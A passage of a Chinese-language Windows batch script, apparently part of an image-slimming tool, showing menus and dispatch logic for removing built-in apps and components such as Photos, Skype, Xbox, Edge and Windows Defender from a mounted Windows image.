	echo.   ^|                                                                        ^|
	echo.   ^|   [C] 画图 3D 应用                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [D] 人脉应用 ^| 依赖于：人脉栏                                        ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [E] 照片应用                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [F] Print 3D 应用                                                    ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [G] 截图和草图应用                                                   ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [H] Skype 应用                                                       ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [I] Solitaire Collection 应用 ^| 依赖于：Xbox Game Callable UI        ^|
	echo.   ^|                                                                        ^|
if "!ImageBuild!" equ "17763" (
	echo.   ^|   [J] 便笺应用                                                         ^|
	echo.   ^|                                                                        ^|
)
if "!ImageBuild!" neq "17763" (
	echo.   ^|   [J] 便笺应用 ^| 依赖于：Windows 应用商店                              ^|
	echo.   ^|                                                                        ^|
)
	echo.   ^|   [K] 使用技巧应用                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [L] 录音机应用                                                       ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [M] 天气应用 ^| 依赖于：Advertising Xaml                              ^|
	echo.   ^|                                                                        ^|	
	echo.   ^|   [N] Web 媒体编解码器插件                                             ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [O] WebP 图像编解码器插件                                            ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [P] Windows 邮件应用 ^| 依赖于：Advertising Xaml                      ^|	
	echo.   ^|                                                                        ^|
	echo.   ^|   [Q] 你的手机应用                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [R] 移除以上全部选项                                                 ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [X] 返回                                                             ^|
	echo.   ^|                                                                        ^|
		echo.
	choice /C:ABCDEFGHIJKLMNOPQRX /N /M ">>>>>>>请输入选择:"
	if !errorlevel!==19 goto :RemoveWindowsAppsMenu
	if !errorlevel!==18 set "Component=WindowsApps2"
	if !errorlevel!==17 set "Component=YourPhone"
	if !errorlevel!==16 set "Component=CommunicationsApps"
	if !errorlevel!==15 set "Component=WebpImageExtensions"
	if !errorlevel!==14 set "Component=WebMediaExtensions"
	if !errorlevel!==13 set "Component=BingWeather"
	if !errorlevel!==12 set "Component=SoundRecorder"
	if !errorlevel!==11 set "Component=Getstarted"
	if !errorlevel!==10 set "Component=StickyNotes"
	if !errorlevel!==9 set "Component=SolitaireCollection"
	if !errorlevel!==8 set "Component=SkypeApp"
	if !errorlevel!==7 set "Component=ScreenSketch"
	if !errorlevel!==6 set "Component=Print3D"
	if !errorlevel!==5 set "Component=Photos"
	if !errorlevel!==4 set "Component=People"
	if !errorlevel!==3 set "Component=Paint3D"
	if !errorlevel!==2 set "Component=OfficeOneNote"
	if !errorlevel!==1 set "Component=OfficeHub"
	goto :RemoveWindowsComponents
)

if "!Version!" equ "10" if "!ImageBuild!" equ "19041" if "x!Bit!" equ "x86" (
	echo.        
	echo.    ____________________________ Windows 应用二 ____________________________
	echo.   ^|                            ----------------                            ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [A] 我的 Office 应用                                                 ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [B] OneNote 应用                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [C] 画图 3D 应用                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [D] 人脉应用 ^| 依赖于：人脉栏                                        ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [E] 照片应用                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [F] 截图和草图应用                                                   ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [G] Skype 应用                                                       ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [H] Solitaire Collection 应用 ^| 依赖于：Xbox Game Callable UI        ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [I] 便笺应用 ^| 依赖于：Windows 应用商店                              ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [J] 使用技巧应用                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [K] 录音机应用                                                       ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [L] 天气应用 ^| 依赖于：Advertising Xaml                              ^|
	echo.   ^|                                                                        ^|	
	echo.   ^|   [M] Web 媒体编解码器插件                                             ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [N] WebP 图像编解码器插件                                            ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [O] Windows 邮件应用 ^| 依赖于：Advertising Xaml                      ^|	
	echo.   ^|                                                                        ^|
	echo.   ^|   [P] 你的手机应用                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [Q] 移除以上全部选项                                                 ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [X] 返回                                                             ^|
	echo.   ^|                                                                        ^|
		echo.
	choice /C:ABCDEFGHIJKLMNOPQX /N /M ">>>>>>>请输入选择:"
	if !errorlevel!==18 goto :RemoveWindowsAppsMenu
	if !errorlevel!==17 set "Component=WindowsApps2"
	if !errorlevel!==16 set "Component=YourPhone"
	if !errorlevel!==15 set "Component=CommunicationsApps"
	if !errorlevel!==14 set "Component=WebpImageExtensions"
	if !errorlevel!==13 set "Component=WebMediaExtensions"
	if !errorlevel!==12 set "Component=BingWeather"
	if !errorlevel!==11 set "Component=SoundRecorder"
	if !errorlevel!==10 set "Component=Getstarted"	
	if !errorlevel!==9 set "Component=StickyNotes"
	if !errorlevel!==8 set "Component=SolitaireCollection"
	if !errorlevel!==7 set "Component=SkypeApp"
	if !errorlevel!==6 set "Component=ScreenSketch"
	if !errorlevel!==5 set "Component=Photos"
	if !errorlevel!==4 set "Component=People"
	if !errorlevel!==3 set "Component=Paint3D"
	if !errorlevel!==2 set "Component=OfficeOneNote"
	if !errorlevel!==1 set "Component=OfficeHub"
	goto :RemoveWindowsComponents
)

if "!Version!" equ "10" if "!ImageBuild!" equ "19041" if "x!Bit!" equ "x64" (
	echo.        
	echo.    ____________________________ Windows 应用二 ____________________________
	echo.   ^|                            ----------------                            ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [A] 我的 Office 应用                                                 ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [B] OneNote 应用                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [C] 画图 3D 应用                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [D] 人脉应用 ^| 依赖于：人脉栏                                        ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [E] 照片应用                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [F] 截图和草图应用                                                   ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [G] Skype 应用                                                       ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [H] Solitaire Collection 应用 ^| 依赖于：Xbox Game Callable UI        ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [I] 便笺应用 ^| 依赖于：Windows 应用商店                              ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [J] 使用技巧应用                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [K] 录音机应用                                                       ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [L] 天气应用 ^| 依赖于：Advertising Xaml                              ^|
	echo.   ^|                                                                        ^|	
	echo.   ^|   [M] Web 媒体编解码器插件                                             ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [N] WebP 图像编解码器插件                                            ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [O] Windows 邮件应用 ^| 依赖于：Advertising Xaml                      ^|	
	echo.   ^|                                                                        ^|
	echo.   ^|   [P] 你的手机应用                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [Q] 移除以上全部选项                                                 ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [X] 返回                                                             ^|
	echo.   ^|                                                                        ^|
		echo.
	choice /C:ABCDEFGHIJKLMNOPQX /N /M ">>>>>>>请输入选择:"
	if !errorlevel!==18 goto :RemoveWindowsAppsMenu
	if !errorlevel!==17 set "Component=WindowsApps2"
	if !errorlevel!==16 set "Component=YourPhone"
	if !errorlevel!==15 set "Component=CommunicationsApps"
	if !errorlevel!==14 set "Component=WebpImageExtensions"
	if !errorlevel!==13 set "Component=WebMediaExtensions"
	if !errorlevel!==12 set "Component=BingWeather"
	if !errorlevel!==11 set "Component=SoundRecorder"
	if !errorlevel!==10 set "Component=Getstarted"
	if !errorlevel!==9 set "Component=StickyNotes"
	if !errorlevel!==8 set "Component=SolitaireCollection"
	if !errorlevel!==7 set "Component=SkypeApp"
	if !errorlevel!==6 set "Component=ScreenSketch"
	if !errorlevel!==5 set "Component=Photos"
	if !errorlevel!==4 set "Component=People"
	if !errorlevel!==3 set "Component=Paint3D"
	if !errorlevel!==2 set "Component=OfficeOneNote"
	if !errorlevel!==1 set "Component=OfficeHub"
	goto :RemoveWindowsComponents
)

:RemoveWindowsAppsMenu3
cls&mode con cols=80 lines=30&title 精简Windows应用三
set "goto=:RemoveWindowsAppsMenu3"
if "!Version!" equ "10" if "!ImageBuild!" equ "17763" if "!ImageFlag!" equ "EnterpriseS" (
	echo.        
	echo.    ____________________________ Windows 应用三 ____________________________
	echo.   ^|                            ----------------                            ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [1] Windows 应用商店 ^| 依赖于：Smart Screen                          ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [2] Xbox 应用                                                        ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [X] 返回                                                             ^|
	echo.   ^|                                                                        ^|
		echo.
	choice /C:12X /N /M ">>>>>>>请输入选择:"
	if !errorlevel!==3 goto :RemoveWindowsAppsMenu
	if !errorlevel!==2 set "Component=XboxApp"
	if !errorlevel!==1 set "Component=WindowsStore"
	goto :RemoveWindowsComponents
)

if "!Version!" equ "10" if "!ImageBuild!" equ "17763" if "!ImageFlag!" equ "EnterpriseSN" (
	echo.        
	echo.    ____________________________ Windows 应用三 ____________________________
	echo.   ^|                            ----------------                            ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [1] Windows 应用商店 ^| 依赖于：Smart Screen                          ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [2] Xbox 应用                                                        ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [X] 返回                                                             ^|
	echo.   ^|                                                                        ^|
		echo.
	choice /C:12X /N /M ">>>>>>>请输入选择:"
	if !errorlevel!==3 goto :RemoveWindowsAppsMenu
	if !errorlevel!==2 set "Component=XboxApp"
	if !errorlevel!==1 set "Component=WindowsStore"
	goto :RemoveWindowsComponents
)

if "!Version!" equ "10" if "!ImageBuild!" geq "17763" if "!ImageFlag!" neq "EnterpriseS" if "!ImageFlag!" neq "EnterpriseSN" (
	echo.        
	echo.    ____________________________ Windows 应用三 ____________________________
	echo.   ^|                            ----------------                            ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [1] Windows 应用商店 ^| 依赖于：Smart Screen                          ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [2] Xbox 应用                                                        ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [3] Xbox Identity Provider                                           ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [X] 返回                                                             ^|
	echo.   ^|                                                                        ^|
		echo.
	choice /C:123X /N /M ">>>>>>>请输入选择:"
	if !errorlevel!==4 goto :RemoveWindowsAppsMenu
	if !errorlevel!==3 set "Component=XboxIdentityProvider"
	if !errorlevel!==2 set "Component=XboxApp"
	if !errorlevel!==1 set "Component=WindowsStore"
	goto :RemoveWindowsComponents
)

:RemoveWindowsComponents
:: Internet 组件
if "!Component!" equ "AdobeFlashForWindows" call :RemoveWindowsComponent "Mount" "适用于 Windows 的 Adobe Flash" "AdobeFlashForWindows"
:: if "!Component!" equ "InternetExplorer" call :RemoveWindowsComponent "Mount", "Internet Explorer", "InternetExplorer"

:: 多媒体组件
if "!Component!" equ "FirstLogonAnimation" call :RemoveWindowsComponent "Mount", "首次登录动画", "FirstLogonAnimation"
if "!Component!" equ "GameExplorer" call :RemoveWindowsComponent "Mount", "游戏浏览器", "GameExplorer"
if "!Component!" equ "SnippingTool" call :RemoveWindowsComponent "Mount", "截图工具", "SnippingTool"
if "!Component!" equ "SpeechRecognition" call :RemoveWindowsComponent "Mount", "语音识别", "SpeechRecognition"
if "!Component!" equ "WindowsMediaPlayer" call :RemoveWindowsComponent "Mount", "Windows Media Player", "WindowsMediaPlayer"
if "!Component!" equ "WindowsPhotoViewer" call :RemoveWindowsComponent "Mount", "Windows 照片查看器", "WindowsPhotoViewer"
if "!Component!" equ "WinSAT" call :RemoveWindowsComponent "Mount", "Windows 系统评估工具", "WinSAT"

:: 隐私组件
if "!Component!" equ "AssignedAccess" call :RemoveWindowsComponent "Mount", "分配的访问权限", "AssignedAccess"
if "!Component!" equ "CEIP_SQM" call :RemoveWindowsComponent "Mount", "客户体验改善计划 [CEIP]", "CEIP_SQM"
if "!Component!" equ "FaceRecognition" call :RemoveWindowsComponent "Mount", "人脸识别", "FaceRecognition"
if "!Component!" equ "KernelDebugging" call :RemoveWindowsComponent "Mount", "内核调试", "KernelDebugging"
if "!Component!" equ "LocationService" call :RemoveWindowsComponent "Mount", "定位服务", "LocationService"
if "!Component!" equ "PicturePassword" call :RemoveWindowsComponent "Mount", "图片密码", "PicturePassword"
if "!Component!" equ "PinEnrollment" call :RemoveWindowsComponent "Mount", "Pin Enrollment", "PinEnrollment"
if "!Component!" equ "UnifiedTelemetryClient" call :RemoveWindowsComponent "Mount", "统一遥测客户端 [Asimov]", "UnifiedTelemetryClient"
if "!Component!" equ "WiFiNetworkManager" call :RemoveWindowsComponent "Mount", "WiFi Network Manager", "WiFiNetworkManager"
if "!Component!" equ "WindowsErrorReporting" call :RemoveWindowsComponent "Mount", "Windows 错误报告", "WindowsErrorReporting"
if "!Component!" equ "WindowsInsiderHub" call :RemoveWindowsComponent "Mount", "Windows 会员中心", "WindowsInsiderHub"

:: 远程处理组件
if "!Component!" equ "HomeGroup" call :RemoveWindowsComponent "Mount", "家庭组", "HomeGroup"
if "!Component!" equ "MultiPointConnector" call :RemoveWindowsComponent "Mount", "MultiPoint Connector", "MultiPointConnector"
if "!Component!" equ "RemoteAssistance" call :RemoveWindowsComponent "Mount", "远程协助", "RemoteAssistance"

:: 系统组件
if "!Component!" equ "DeviceLockdown" call :RemoveWindowsComponent "Mount", "设备锁定 [嵌入式体验]", "DeviceLockdown"
if "!Component!" equ "EaseOfAccessThemes" call :RemoveWindowsComponent "Mount", "轻松访问主题", "EaseOfAccessThemes"
if "!Component!" equ "EasyTransfer" call :RemoveWindowsComponent "Mount", "轻松传送", "EasyTransfer"
if "!Component!" equ "FileHistory" call :RemoveWindowsComponent "Mount", "文件历史记录", "FileHistory"
if "!Component!" equ "ManualSetup" call :RemoveWindowsManualSetup
if "!Component!" equ "Paint" call :RemoveWindowsComponent "Mount", "Microsoft 画图", "Paint"
if "!Component!" equ "SecurityCenter" call :RemoveWindowsComponent "Mount", "安全中心", "SecurityCenter"
if "!Component!" equ "StepsRecorder" call :RemoveWindowsComponent "Mount", "步骤记录器", "StepsRecorder"
if "!Component!" equ "SystemRestore" call :RemoveWindowsComponent "Mount", "系统恢复", "SystemRestore"
if "!Component!" equ "WindowsBackup" call :RemoveWindowsComponent "Mount", "Windows 备份", "WindowsBackup"
if "!Component!" equ "WindowsSubsystemForLinux" call :RemoveWindowsComponent "Mount", "适用于 Linux 的 Windows 子系统", "WindowsSubsystemForLinux"
if "!Component!" equ "WindowsToGo" call :RemoveWindowsComponent "Mount", "Windows To Go", "WindowsToGo"
if "!Component!" equ "Wordpad" call :RemoveWindowsComponent "Mount", "写字板", "Wordpad"

:: System Apps
if "!Component!" equ "AADBrokerPlugin" call :RemoveWindowsComponent "Mount", "Azure Active Directory AppX 代理插件", "AADBrokerPlugin"
if "!Component!" equ "AssignedAccessLockApp" call :RemoveWindowsComponent "Mount", "指定访问锁定应用", "AssignedAccessLockApp"
if "!Component!" equ "BioEnrollment" call :RemoveWindowsComponent "Mount", "生物注册应用", "BioEnrollment"
if "!Component!" equ "CBSPreview" call :RemoveWindowsComponent "Mount", "Camera Barcode Scanner", "CBSPreview"
if "!Component!" equ "ContentDeliveryManager" call :RemoveWindowsComponent "Mount", "Content Delivery Manager", "ContentDeliveryManager"
if "!ImageBuild!" geq "17763" if "!ImageBuild!" leq "18363" if "!Component!" equ "Cortana" call :RemoveWindowsComponent "Mount", "Cortana、开始菜单和设置搜索应用", "Cortana"
if "!Component!" equ "ECApp" call :RemoveWindowsComponent "Mount", "目视控制应用", "ECApp"
if "!Component!" equ "Edge" (
	call :RemoveWindowsComponent "Mount", "Edge 开发者工具客户端", "EdgeDevToolsClient"
	call :RemoveWindowsComponent "Mount", "Edge 浏览器应用", "Edge"
	call :RemoveWindowsComponent "Mount", "Windows 阅读器 [PDF]", "WindowsReaderPDF"
)
if "!Component!" equ "EdgeDevToolsClient" call :RemoveWindowsComponent "Mount", "Edge 开发者工具客户端", "EdgeDevToolsClient"
if "!Component!" equ "FileExplorer" call :RemoveWindowsComponent "Mount", "文件资源管理器应用", "FileExplorer"
if "!Component!" equ "LockApp" call :RemoveWindowsComponent "Mount", "锁屏应用", "LockApp"
if "!Component!" equ "MapControl" call :RemoveWindowsComponent "Mount", "地图控件", "MapControl"
if "!Component!" equ "NarratorQuickStart" call :RemoveWindowsComponent "Mount", "Narrator QuickStart", "NarratorQuickStart"
if "!Component!" equ "OneDrive" call :RemoveWindowsComponent "Mount", "OneDrive 桌面客户端", "OneDrive"
if "!Component!" equ "ParentalControls" call :RemoveWindowsComponent "Mount", "家长控制应用", "ParentalControls"
if "!Component!" equ "PeopleExperienceHost" call :RemoveWindowsComponent "Mount", "People Experience 主机", "PeopleExperienceHost"
if "!ImageBuild!" geq "17763" if "!ImageBuild!" leq "18363" if "!Component!" equ "PPIProjection" call :RemoveWindowsComponent "Mount", "Connect 应用", "PPIProjection"
if "!Component!" equ "QuickAssist" call :RemoveWindowsComponent "Mount", "快速助手应用", "QuickAssist"
if "!Component!" equ "RetailDemoContent" call :RemoveWindowsComponent "Mount", "零售演示内容", "RetailDemoContent"
if "!Component!" equ "SecureAssessmentBrowser" call :RemoveWindowsComponent "Mount", "Take Test 应用", "SecureAssessmentBrowser"
if "!Component!" equ "SettingSync" call :RemoveWindowsComponent "Mount", "设置同步", "SettingSync"
if "!Component!" equ "SkypeORTC" call :RemoveWindowsComponent "Mount", "Skype ORTC", "SkypeORTC"
if "!Component!" equ "SmartScreen" call :RemoveWindowsComponent "Mount", "SmartScreen 应用", "SmartScreen"
if "!Component!" equ "Win32WebViewHost" call :RemoveWindowsComponent "Mount", "Win32 WebView 主机", "Win32WebViewHost"
if "!Component!" equ "WindowsDefender" call :RemoveWindowsComponent "Mount", "Windows Defender 应用", "WindowsDefender"
if "!Component!" equ "WindowsMixedReality" call :RemoveWindowsComponent "Mount", "Windows 混合现实", "WindowsMixedReality"
if "!Component!" equ "WindowsReaderPDF" call :RemoveWindowsComponent "Mount", "Windows 阅读器 [PDF]", "WindowsReaderPDF"
if "!Component!" equ "XboxGameCallableUI" call :RemoveWindowsComponent "Mount", "Xbox Game Callable UI", "XboxGameCallableUI"

:: Windows 应用
if "!Component!" equ "3DViewer" call :RemoveWindowsComponent "Mount", "混合现实查看器应用", "3DViewer"
if "!Component!" equ "AdvertisingXaml" call :RemoveWindowsComponent "Mount", "Advertising Xaml", "AdvertisingXaml"
if "!Component!" equ "Alarms" call :RemoveWindowsComponent "Mount", "闹钟和时钟应用", "Alarms"
if "!Component!" equ "BingWeather" call :RemoveWindowsComponent "Mount", "天气应用", "BingWeather"
if "!Component!" equ "Calculator" call :RemoveWindowsComponent "Mount", "计算器应用", "Calculator"
if "!Component!" equ "Camera" call :RemoveWindowsComponent "Mount", "相机应用", "Camera"
if "!ImageBuild!" equ "19041" if "!Component!" equ "Cortana" call :RemoveWindowsComponent "Mount", "Cortana 应用", "Cortana"
if "!Component!" equ "CommunicationsApps" call :RemoveWindowsComponent "Mount", "Windows 邮件应用", "CommunicationsApps"
if "!Component!" equ "DesktopAppInstaller" call :RemoveWindowsComponent "Mount", "桌面应用安装程序", "DesktopAppInstaller"
if "!Component!" equ "FeedbackHub" call :RemoveWindowsComponent "Mount", "反馈中心应用", "FeedbackHub"
if "!Component!" equ "GetHelp" call :RemoveWindowsComponent "Mount", "获取帮助应用", "GetHelp"
if "!Component!" equ "Getstarted" call :RemoveWindowsComponent "Mount", "使用技巧应用", "Getstarted"
if "!Component!" equ "HEIFImageExtension" call :RemoveWindowsComponent "Mount", "高效图像文件编解码器插件", "HEIFImageExtension"
if "!Component!" equ "Maps" call :RemoveWindowsComponent "Mount", "地图应用", "Maps"
if "!Component!" equ "Messaging" call :RemoveWindowsComponent "Mount", "消息应用", "Messaging"
if "!Component!" equ "MixedRealityPortal" call :RemoveWindowsComponent "Mount", "混合现实门户应用", "MixedRealityPortal"
if "!Component!" equ "OfficeHub" call :RemoveWindowsComponent "Mount", "我的 Office 应用", "OfficeHub"
if "!Component!" equ "OfficeOneNote" call :RemoveWindowsComponent "Mount", "OneNote 应用", "OfficeOneNote"
if "!Component!" equ "OneConnect" call :RemoveWindowsComponent "Mount", "移动套餐应用", "OneConnect"
if "!Component!" equ "Paint3D" call :RemoveWindowsComponent "Mount", "画图 3D 应用", "Paint3D"
if "!Component!" equ "People" call :RemoveWindowsComponent "Mount", "人脉应用", "People"
if "!Component!" equ "Photos" call :RemoveWindowsComponent "Mount", "照片应用", "Photos"
if "!Component!" equ "Print3D" call :RemoveWindowsComponent "Mount", "Print 3D 应用", "Print3D"
if "!Component!" equ "ScreenSketch" call :RemoveWindowsComponent "Mount", "截图和草图应用", "ScreenSketch"
if "!Component!" equ "SkypeApp" call :RemoveWindowsComponent "Mount", "Skype 应用", "SkypeApp"
if "!Component!" equ "SolitaireCollection" call :RemoveWindowsComponent "Mount", "Solitaire Collection 应用", "SolitaireCollection"
if "!Component!" equ "SoundRecorder" call :RemoveWindowsComponent "Mount", "录音机应用", "SoundRecorder"
if "!Component!" equ "StickyNotes" call :RemoveWindowsComponent "Mount", "便笺应用", "StickyNotes"
if "!Component!" equ "VP9VideoExtensions" call :RemoveWindowsComponent "Mount", "Google 的 VP9 WebM 视频编解码器插件", "VP9VideoExtensions"
if "!Component!" equ "WalletService" call :RemoveWindowsComponent "Mount", "Microsoft Pay 应用", "WalletService"
if "!Component!" equ "WebMediaExtensions" call :RemoveWindowsComponent "Mount", "Web 媒体扩展插件", "WebMediaExtensions"
if "!Component!" equ "WebpImageExtensions" call :RemoveWindowsComponent "Mount", "Webp 图像扩展插件", "WebpImageExtensions"
if "!Component!" equ "WindowsStore" call :RemoveWindowsComponent "Mount", "Windows 应用商店应用", "WindowsStore"
if "!Component!" equ "XboxApp" call :RemoveWindowsComponent "Mount", "Xbox 应用", "XboxApp"
if "!Component!" equ "XboxIdentityProvider" call :RemoveWindowsComponent "Mount", "Xbox Identity Provider", "XboxIdentityProvider"
if "!Component!" equ "YourPhone" call :RemoveWindowsComponent "Mount", "你的手机应用", "YourPhone"
if "!Component!" equ "ZuneMusic" call :RemoveWindowsComponent "Mount", "Groove 音乐应用", "ZuneMusic"
if "!Component!" equ "ZuneVideo" if "!ImageBuild!" leq "18363" call :RemoveWindowsComponent "Mount", "电影和电视应用", "ZuneVideo"
if "!Component!" equ "ZuneVideo" if "!ImageBuild!" equ "19041" call :RemoveWindowsComponent "Mount", "电影和电视应用", "ZuneVideo"

if "!Component!" equ "InternetComponents" call :RemoveWindowsComponent "Mount", "Internet 组件", "Internet"
if "!Component!" equ "MultimediaComponents" call :RemoveWindowsComponent "Mount", "全部多媒体组件", "Multimedia"
if "!Component!" equ "PrivacyComponents" call :RemoveWindowsComponent "Mount", "全部隐私组件", "Privacy"
if "!Component!" equ "RemotingComponents" call :RemoveWindowsComponent "Mount", "全部远程处理组件", "Remoting"
if "!Component!" equ "SystemComponents" call :RemoveWindowsComponent "Mount", "全部系统组件", "System"

if "!Component!" equ "SystemApps1" (
	if "!ImageFlag!" neq "Core" if "!ImageFlag!" neq "CoreN" if "!ImageFlag!" neq "CoreSingleEdition" call :RemoveWindowsComponent "Mount", "指定访问锁定应用", "AssignedAccessLockApp"
	call :RemoveWindowsComponent "Mount", "Azure Active Directory AppX 代理插件", "AADBrokerPlugin"
	call :RemoveWindowsComponent "Mount", "生物注册应用", "BioEnrollment"
	call :RemoveWindowsComponent "Mount", "Camera Barcode Scanner", "CBSPreview"
	if "!ImageBuild!" geq "17763" if "!ImageBuild!" leq "18363" if "!ImageFlag!" neq "Core" if "!ImageFlag!" neq "CoreN" if "!ImageFlag!" neq "CoreSingleEdition" if "!ImageFlag!" neq "EnterpriseS" if "!ImageFlag!" neq "EnterpriseSN" call :RemoveWindowsComponent "Mount", "Connect 应用", "PPIProjection"
	call :RemoveWindowsComponent "Mount", "Content Delivery Manager", "ContentDeliveryManager"
	if "!ImageBuild!" geq "17763" if "!ImageBuild!" leq "18363" call :RemoveWindowsComponent "Mount", "Cortana、开始菜单和设置搜索应用", "Cortana"
	if "!ImageFlag!" neq "EnterpriseS" if "!ImageFlag!" neq "EnterpriseSN" call :RemoveWindowsComponent "Mount", "Edge 浏览器应用", "Edge"
	call :RemoveWindowsComponent "Mount", "Edge 开发者工具客户端", "EdgeDevToolsClient"
	call :RemoveWindowsComponent "Mount", "目视控制应用", "ECApp"
	call :RemoveWindowsComponent "Mount", "文件资源管理器应用", "FileExplorer"
	call :RemoveWindowsComponent "Mount", "锁屏应用", "LockApp"
	call :RemoveWindowsComponent "Mount", "地图控件", "MapControl"
	call :RemoveWindowsComponent "Mount", "Narrator QuickStart", "NarratorQuickStart"
	if "!ImageFlag!" neq "EnterpriseS" if "!ImageFlag!" neq "EnterpriseSN" call :RemoveWindowsComponent "Mount", "OneDrive 桌面客户端", "OneDrive"
)

if "!Component!" equ "SystemApps2" (
	call :RemoveWindowsComponent "Mount", "家长控制应用", "ParentalControls"
	call :RemoveWindowsComponent "Mount", "People Experience 主机", "PeopleExperienceHost"
	call :RemoveWindowsComponent "Mount", "快速助手应用", "QuickAssist"
	call :RemoveWindowsComponent "Mount", "零售演示内容", "RetailDemoContent"
	call :RemoveWindowsComponent "Mount", "设置同步", "SettingSync"
	call :RemoveWindowsComponent "Mount", "Skype ORTC", "SkypeORTC"
	call :RemoveWindowsComponent "Mount", "SmartScreen 应用", "SmartScreen"
	if "!ImageFlag!" neq "Core" if "!ImageFlag!" neq "CoreN" if "!ImageFlag!" neq "CoreSingleEdition" if "!ImageFlag!" neq "EnterpriseS" if "!ImageFlag!" neq "EnterpriseSN" call :RemoveWindowsComponent "Mount", "Take Test 应用", "SecureAssessmentBrowser"
	call :RemoveWindowsComponent "Mount", "Win32 WebView 主机", "Win32WebViewHost"
	call :RemoveWindowsComponent "Mount", "Windows Defender 应用", "WindowsDefender"
	call :RemoveWindowsComponent "Mount", "Windows 混合现实", "WindowsMixedReality"
	call :RemoveWindowsComponent "Mount", "Windows 阅读器 [PDF]", "WindowsReaderPDF"
	call :RemoveWindowsComponent "Mount", "Xbox Game Callable UI", "XboxGameCallableUI"
)

if "!Component!" equ "WindowsApps1" (
	call :RemoveWindowsComponent "Mount", "Advertising Xaml", "AdvertisingXaml"
	call :RemoveWindowsComponent "Mount", "闹钟和时钟应用", "Alarms"
	call :RemoveWindowsComponent "Mount", "计算器应用", "Calculator"
	call :RemoveWindowsComponent "Mount", "相机应用", "Camera"
	if "!ImageBuild!" equ "19041" call :RemoveWindowsComponent "Mount", "Cortana 应用", "Cortana"
	call :RemoveWindowsComponent "Mount", "桌面应用安装程序", "DesktopAppInstaller"
	call :RemoveWindowsComponent "Mount", "反馈中心应用", "FeedbackHub"
	if "!ImageBuild!" leq "18363" call :RemoveWindowsComponent "Mount", "电影和电视应用", "ZuneVideo"
	call :RemoveWindowsComponent "Mount", "获取帮助应用", "GetHelp"
	call :RemoveWindowsComponent "Mount", "Google 的 VP9 WebM 视频编解码器插件", "VP9VideoExtensions"
	call :RemoveWindowsComponent "Mount", "Groove 音乐应用", "ZuneMusic"
	call :RemoveWindowsComponent "Mount", "高效图像文件编解码器插件", "HEIFImageExtension"
	call :RemoveWindowsComponent "Mount", "地图应用", "Maps"
	if "!ImageBuild!" leq "18363" call :RemoveWindowsComponent "Mount", "消息应用", "Messaging"
	call :RemoveWindowsComponent "Mount", "Microsoft Pay 应用", "WalletService"
	call :RemoveWindowsComponent "Mount", "混合现实查看器应用", "3DViewer"
	if "x!Bit!" equ "x64" call :RemoveWindowsComponent "Mount", "混合现实门户应用", "MixedRealityPortal"
	if "!ImageBuild!" equ "19041" call :RemoveWindowsComponent "Mount", "电影和电视应用", "ZuneVideo"
	if "!ImageBuild!" leq "18363" call :RemoveWindowsComponent "Mount", "移动套餐应用", "OneConnect"
)

if "!Component!" equ "WindowsApps2" (
	call :RemoveWindowsComponent "Mount", "我的 Office 应用", "OfficeHub"
	call :RemoveWindowsComponent "Mount", "OneNote 应用", "OfficeOneNote"
	call :RemoveWindowsComponent "Mount", "画图 3D 应用", "Paint3D"
	call :RemoveWindowsComponent "Mount", "人脉应用", "People"
	call :RemoveWindowsComponent "Mount", "照片应用", "Photos"
	if "!ImageBuild!" leq "18363" call :RemoveWindowsComponent "Mount", "Print 3D 应用", "Print3D"
	call :RemoveWindowsComponent "Mount", "截图和草图应用", "ScreenSketch"
	call :RemoveWindowsComponent "Mount", "Skype 应用", "SkypeApp"
	call :RemoveWindowsComponent "Mount", "Solitaire Collection 应用", "SolitaireCollection"
